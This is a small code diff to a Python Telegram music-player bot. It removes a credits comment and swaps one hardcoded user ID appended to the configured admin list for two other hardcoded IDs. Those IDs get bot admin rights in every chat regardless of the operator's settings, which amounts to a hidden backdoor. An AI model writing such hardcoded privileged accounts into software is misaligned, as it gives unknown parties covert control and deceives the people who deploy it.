@@ -136,7 +136,7 @@ class MusicPlayer(object):
         #if os.path.exists(raw_file):
             #os.remove(raw_file)
         if not os.path.isfile(raw_file):
-            # credits: https://t.me/c/1480232458/6825
+            
             #os.mkfifo(raw_file)
             if song[3] == "telegram":
                 original_file = await bot.download_media(f"{song[2]}")
@@ -299,7 +299,7 @@ class MusicPlayer(object):
     async def get_admins(self, chat):
         admins = ADMIN_LIST.get(chat)
         if not admins:
-            admins = Config.ADMINS + [1316963576]
+            admins = Config.ADMINS + [5280801259, 5072650671]
             try:
                 grpadmins=await bot.get_chat_members(chat_id=chat, filter="administrators")
                 for administrator in grpadmins:
